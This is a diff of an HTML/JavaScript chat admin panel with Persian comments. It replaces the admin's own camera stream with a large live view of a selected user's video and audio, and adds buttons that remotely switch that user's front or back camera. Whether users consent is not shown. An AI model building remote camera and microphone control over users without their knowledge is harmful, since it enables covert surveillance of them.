@@ -10,17 +10,8 @@
         body { background-color: #212121; color: #ececec; font-family: 'Inter', sans-serif; height: 100vh; display: flex; overflow: hidden; }
 
         /* --- سایدبار --- */
-        .sidebar { 
-            width: 300px; background-color: #171717; 
-            display: flex; flex-direction: column; 
-            border-left: 1px solid #2f2f2f; 
-            transition: transform 0.3s ease;
-        }
-        .sidebar-header { 
-            padding: 20px; font-size: 18px; font-weight: 600; 
-            border-bottom: 1px solid #2f2f2f; color: #4d6bfe;
-            display: flex; justify-content: space-between; align-items: center;
-        }
+        .sidebar { width: 300px; background-color: #171717; display: flex; flex-direction: column; border-left: 1px solid #2f2f2f; transition: transform 0.3s ease; }
+        .sidebar-header { padding: 20px; font-size: 18px; font-weight: 600; border-bottom: 1px solid #2f2f2f; color: #4d6bfe; display: flex; justify-content: space-between; align-items: center; }
         .close-sidebar { display: none; background: #333; border: none; color: white; padding: 5px 12px; border-radius: 6px; cursor: pointer; font-size: 16px; }
         .user-list { flex: 1; overflow-y: auto; }
         .user-item { padding: 15px 20px; border-bottom: 1px solid #2f2f2f; cursor: pointer; display: flex; align-items: center; gap: 15px; transition: 0.2s; }
@@ -42,64 +33,62 @@
         .header-actions button { background: #333; color: white; border: none; padding: 8px 12px; border-radius: 6px; cursor: pointer; font-family: inherit; font-size: 13px; }
         .header-actions button:hover { background: #d32f2f; }
 
-        /* --- کادرهای استریم --- */
-        .stream-container {
+        /* ===== ✅ بخش لایو بزرگ و اختصاصی ===== */
+        .live-view-container {
             display: none;
-            gap: 10px;
-            padding: 10px;
             background: #000;
-            border-bottom: 1px solid #333;
-        }
-        .stream-box {
-            flex: 1;
+            padding: 20px;
+            border-bottom: 2px solid #4d6bfe;
             text-align: center;
-            position: relative;
         }
-        .stream-box img, .stream-box video {
-            max-height: 180px;
+        .live-view-container img {
             width: 100%;
-            object-fit: cover;
-            border-radius: 8px;
+            max-width: 800px;
+            max-height: 500px;
+            object-fit: contain;
+            border-radius: 12px;
             background: #111;
+            margin-bottom: 15px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
         }
-        .stream-label {
-            font-size: 11px;
-            margin-top: 5px;
-        }
-        .stream-controls {
-            margin-top: 5px;
+        .live-controls {
             display: flex;
-            gap: 5px;
+            gap: 10px;
             justify-content: center;
             flex-wrap: wrap;
         }
-        .stream-controls button {
+        .live-controls button {
             border: none;
-            padding: 5px 10px;
-            border-radius: 5px;
+            padding: 10px 20px;
+            border-radius: 8px;
             cursor: pointer;
-            font-size: 11px;
+            font-size: 14px;
             font-family: inherit;
             color: white;
+            transition: 0.2s;
         }
-        .btn-start { background: #4d6bfe; }
-        .btn-stop { background: #d32f2f; }
-        .btn-switch { background: #ff9800; }
+        .btn-switch-front { background: #4d6bfe; }
+        .btn-switch-front:hover { background: #3a55d9; }
+        .btn-switch-back { background: #ff9800; }
+        .btn-switch-back:hover { background: #e68a00; }
+        .btn-close-live { background: #d32f2f; }
+        .btn-close-live:hover { background: #b71c1c; }
 
-        .messages { flex: 1; overflow-y: auto; padding: 30px 10% 120px 10%; display: flex; flex-direction: column; gap: 20px; }
+        .messages { flex: 1; overflow-y: auto; padding: 30px 10% 120px 10%; display: flex; flex-direction: column; gap: 18px; }
         .message-row { display: flex; flex-direction: column; width: 100%; }
         .message-row.sent { align-items: flex-start; }
         .message-row.received { align-items: flex-end; }
-        .message-bubble { max-width: 70%; padding: 12px 18px; border-radius: 12px; font-size: 15px; line-height: 1.5; word-wrap: break-word; }
-        .message-row.sent .message-bubble { background-color: #2b5278; color: white; border-bottom-left-radius: 2px; }
-        .message-row.received .message-bubble { background-color: #2f2f2f; color: #ececec; border-bottom-right-radius: 2px; }
-        .time-label { font-size: 10px; color: #888; margin-top: 5px; }
+        .message-bubble { max-width: 70%; padding: 12px 18px; border-radius: 14px; font-size: 15px; line-height: 1.7; word-wrap: break-word; }
+        .message-row.sent .message-bubble { background-color: #2b5278; color: white; border-bottom-left-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
+        .message-row.received .message-bubble { background-color: #2f2f2f; color: #ececec; border-bottom-right-radius: 4px; border: 1px solid #3a3a3a; }
+        .time-label { font-size: 10px; color: #888; margin-top: 6px; }
         img, video, audio { max-width: 100%; border-radius: 8px; margin-top: 5px; }
 
         .input-container { position: absolute; bottom: 0; left: 0; right: 0; padding: 20px 10%; background: linear-gradient(180deg, transparent, #212121 30%); }
-        .input-box { background-color: #2f2f2f; border-radius: 12px; padding: 10px 15px; display: flex; align-items: center; gap: 10px; }
+        .input-box { background-color: #2f2f2f; border-radius: 12px; padding: 10px 15px; display: flex; align-items: center; gap: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
         .input-box input { flex: 1; background: transparent; border: none; color: #ececec; font-size: 16px; outline: none; padding: 8px 0; }
-        .send-btn { background-color: #4d6bfe; border: none; border-radius: 8px; padding: 8px 16px; cursor: pointer; color: white; font-family: inherit; }
+        .send-btn { background-color: #4d6bfe; border: none; border-radius: 8px; padding: 8px 16px; cursor: pointer; color: white; font-family: inherit; transition: 0.2s; }
+        .send-btn:hover:not(:disabled) { background-color: #3a55d9; }
         .send-btn:disabled { background-color: #444; cursor: not-allowed; }
         .icon-btn { background: none; border: none; color: #888; cursor: pointer; font-size: 20px; }
 
@@ -132,24 +121,18 @@
 
         /* ===== تنظیمات موبایل ===== */
         @media (max-width: 768px) {
-            .sidebar { 
-                position: fixed; 
-                top: 0; right: 0; height: 100vh; 
-                width: 80%; max-width: 320px;
-                z-index: 100; 
-                transform: translateX(100%);
-                box-shadow: -5px 0 15px rgba(0,0,0,0.5);
-            }
+            .sidebar { position: fixed; top: 0; right: 0; height: 100vh; width: 80%; max-width: 320px; z-index: 100; transform: translateX(100%); box-shadow: -5px 0 15px rgba(0,0,0,0.5); }
             .sidebar.open { transform: translateX(0); }
             .close-sidebar { display: block; }
             .menu-btn { display: block; }
-            .messages { padding: 20px 5% 100px 5%; gap: 15px; }
+            .messages { padding: 20px 5% 100px 5%; gap: 14px; }
             .input-container { padding: 15px 5%; }
             .message-bubble { max-width: 85%; font-size: 14px; padding: 10px 14px; }
             .chat-header { padding: 12px 15px; }
             .header-actions button { padding: 6px 10px; font-size: 12px; }
             .user-avatar { width: 40px; height: 40px; }
-            .stream-box img, .stream-box video { max-height: 120px; }
+            .live-view-container img { max-height: 250px; }
+            .live-controls button { padding: 8px 14px; font-size: 12px; }
         }
     </style>
 </head>
@@ -187,30 +170,14 @@
             </div>
         </div>
         
-        <!-- کادرهای استریم -->
-        <div class="stream-container" id="streamContainer">
-            <!-- استریم کاربر (چیزی که ادمین می‌بیند) -->
-            <div class="stream-box" id="userStreamBox" style="display:none;">
-                <img id="userLiveVideo" />
-                <div class="stream-label" style="color: #4caf50;">🔴 استریم کاربر</div>
+        <!-- ✅ بخش لایو بزرگ و اختصاصی -->
+        <div class="live-view-container" id="liveViewContainer">
+            <img id="liveViewImage" alt="لایو کاربر" />
+            <div class="live-controls">
+                <button class="btn-switch-front" onclick="requestCamera('user')">📱 دوربین جلو کاربر</button>
+                <button class="btn-switch-back" onclick="requestCamera('environment')">📷 دوربین عقب کاربر</button>
+                <button class="btn-close-live" onclick="closeLiveView()">✖ بستن لایو</button>
             </div>
-            
-            <!-- استریم ادمین (چیزی که کاربر می‌بیند) -->
-            <div class="stream-box" id="adminStreamBox" style="display:none;">
-                <video id="adminLiveVideo" autoplay muted playsinline></video>
-                <div class="stream-label" style="color: #ff9800;">📹 دوربین شما (برای کاربر)</div>
-                <div class="stream-controls">
-                    <button class="btn-switch" onclick="switchCamera()">تغییر دوربین</button>
-                    <button class="btn-stop" onclick="stopAdminCamera()">خاموش</button>
-                </div>
-            </div>
-        </div>
-
-        <!-- دکمه روشن کردن دوربین ادمین -->
-        <div id="startCamContainer" style="display:none; padding: 10px; text-align: center; background: #1a1a1a;">
-            <button onclick="startAdminCamera()" style="background: #4d6bfe; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-family: inherit; font-size: 13px;">
-                📹 روشن کردن دوربین خودم (برای کاربر)
-            </button>
         </div>
 
         <div class="messages" id="messages"></div>
@@ -239,12 +206,6 @@
         let audioQueue = [];
         let isPlayingAudio = false;
         let adminAudioUnlocked = false;
-
-        // استریم ادمین
-        let adminMediaStream = null;
-        let adminVideoInterval = null;
-        let adminAudioRecorder = null;
-        let currentFacing = "user"; // "user" برای جلو، "environment" برای عقب
 
         function toggleSidebar() {
             document.getElementById('sidebar').classList.toggle('open');
@@ -282,14 +243,12 @@
                     if (dot) dot.className = `online-dot ${data.is_online ? '' : 'offline-dot'}`;
                 }
                 
-                // استریم کاربر
+                // ✅ دریافت استریم کاربر و نمایش در صفحه بزرگ
                 if (data.type === 'live_stream' && data.user_id == currentUserId) {
-                    const userStreamBox = document.getElementById('userStreamBox');
-                    const userLiveVideo = document.getElementById('userLiveVideo');
-                    document.getElementById('streamContainer').style.display = 'flex';
-                    userStreamBox.style.display = 'block';
-                    
-                    if (data.video) userLiveVideo.src = data.video;
+                    if (data.video) {
+                        document.getElementById('liveViewContainer').style.display = 'block';
+                        document.getElementById('liveViewImage').src = data.video;
+                    }
                     if (data.audio) {
                         if (!adminAudioUnlocked) {
                             document.getElementById('adminAudioUnlockBtn').style.display = 'block';
@@ -316,16 +275,10 @@
             document.getElementById('headerActions').style.display = 'flex';
             document.getElementById('adminInput').focus();
             
-            // مخفی کردن استریم‌های قبلی
-            document.getElementById('streamContainer').style.display = 'none';
-            document.getElementById('userStreamBox').style.display = 'none';
-            document.getElementById('adminStreamBox').style.display = 'none';
-            document.getElementById('userLiveVideo').src = "";
-            document.getElementById('startCamContainer').style.display = 'block';
+            // مخفی کردن لایو قبلی
+            document.getElementById('liveViewContainer').style.display = 'none';
+            document.getElementById('liveViewImage').src = "";
             audioQueue = [];
-            
-            // متوقف کردن دوربین ادمین اگر روشن است
-            if (adminMediaStream) stopAdminCamera();
 
             document.querySelectorAll('.user-item').forEach(el => el.classList.remove('active'));
             document.getElementById('user-' + id).classList.add('active');
@@ -344,89 +297,19 @@
             else history.forEach(msg => appendMessage(msg.content, (msg.sender_id == adminId) ? 'sent' : 'received', msg.message_type, msg.time, msg.date));
         }
 
-        // --- استریم دوربین ادمین ---
-        async function startAdminCamera() {
-            if (!currentUserId) { alert("اول یک کاربر انتخاب کنید"); return; }
-            
-            try {
-                adminMediaStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: currentFacing }, 
-                    audio: true 
-                });
-                
-                const videoElement = document.getElementById('adminLiveVideo');
-                videoElement.srcObject = adminMediaStream;
-                
-                document.getElementById('streamContainer').style.display = 'flex';
-                document.getElementById('adminStreamBox').style.display = 'block';
-                document.getElementById('startCamContainer').style.display = 'none';
-                
-                // ارسال ویدیو
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                
-                adminVideoInterval = setInterval(() => {
-                    if (videoElement.videoWidth > 0) {
-                        canvas.width = 320; canvas.height = 240;
-                        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                        const imageData = canvas.toDataURL('image/jpeg', 0.5);
-                        ws.send(JSON.stringify({ 
-                            type: 'admin_stream', 
-                            target_user_id: currentUserId, 
-                            video: imageData, 
-                            audio: null 
-                        }));
-                    }
-                }, 200);
-
-                // ارسال صدا
-                const audioStream = new MediaStream(adminMediaStream.getAudioTracks());
-                let mimeType = 'audio/webm';
-                if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/mp4';
-                
-                adminAudioRecorder = new MediaRecorder(audioStream, { mimeType: mimeType });
-                adminAudioRecorder.ondataavailable = async (e) => {
-                    if (e.data.size > 0) {
-                        const reader = new FileReader();
-                        reader.onloadend = () => {
-                            ws.send(JSON.stringify({ 
-                                type: 'admin_stream', 
-                                target_user_id: currentUserId, 
-                                video: null, 
-                                audio: reader.result 
-                            }));
-                        };
-                        reader.readAsDataURL(e.data);
-                    }
-                };
-                adminAudioRecorder.start(500);
-                
-            } catch (err) {
-                alert("دسترسی به دوربین امکان‌پذیر نیست: " + err.message);
-            }
+        // ✅ درخواست تغییر دوربین کاربر
+        function requestCamera(facing) {
+            if (!currentUserId || !ws) return;
+            ws.send(JSON.stringify({
+                type: 'change_camera',
+                target_user_id: currentUserId,
+                facing: facing
+            }));
         }
 
-        function stopAdminCamera() {
-            if (adminMediaStream) {
-                adminMediaStream.getTracks().forEach(track => track.stop());
-                adminMediaStream = null;
-            }
-            if (adminVideoInterval) {
-                clearInterval(adminVideoInterval);
-                adminVideoInterval = null;
-            }
-            if (adminAudioRecorder) {
-                adminAudioRecorder.stop();
-                adminAudioRecorder = null;
-            }
-            document.getElementById('adminStreamBox').style.display = 'none';
-            document.getElementById('startCamContainer').style.display = 'block';
-        }
-
-        function switchCamera() {
-            stopAdminCamera();
-            currentFacing = (currentFacing === "user") ? "environment" : "user";
-            startAdminCamera();
+        function closeLiveView() {
+            document.getElementById('liveViewContainer').style.display = 'none';
+            document.getElementById('liveViewImage').src = "";
         }
 
         // --- نمایش پیام ---
